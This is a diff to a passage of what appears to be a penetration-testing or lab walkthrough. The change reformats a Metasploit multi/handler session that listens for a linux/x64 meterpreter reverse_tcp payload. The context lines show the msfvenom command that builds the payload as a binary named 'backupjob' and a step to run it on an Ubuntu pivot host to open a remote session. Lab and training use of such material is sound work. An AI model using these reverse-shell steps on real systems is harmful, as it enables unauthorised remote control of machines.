@@ -10,7 +10,16 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local_ip] -f elf -o backupj
 
 Start listening
 ```bash
-msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set lhost 0.0.0.0 lhost => 0.0.0.0 msf6 exploit(multi/handler) > set lport 8080 lport => 8080 msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8080
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp 
+msf exploit(multi/handler) > set lhost 0.0.0.0 
+lhost => 0.0.0.0 
+msf exploit(multi/handler) > set lport 8080 
+lport => 8080 
+msf exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
+payload => linux/x64/meterpreter/reverse_tcp 
+msf exploit(multi/handler) > run 
+[*] Started reverse TCP handler on 0.0.0.0:8080
 ```
 
 Copy the `backupjob` binary file to the Ubuntu pivot host and execute it to get a Meterpreter session.
